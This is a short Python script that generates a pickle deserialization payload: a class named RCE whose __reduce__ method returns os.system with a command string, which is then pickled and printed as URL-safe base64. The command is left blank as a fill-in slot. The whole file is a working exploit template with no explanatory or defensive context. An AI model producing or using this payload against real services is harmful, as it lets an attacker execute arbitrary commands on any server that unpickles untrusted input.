import pickle
import os
import base64

#Python3
class RCE(object):
    def __reduce__(self):
        command = "" #Command to execute
        return os.system, (command,)

if __name__ == '__main__':
    a = RCE()
    pickled = pickle.dumps(a)
    print(base64.urlsafe_b64encode(pickled))


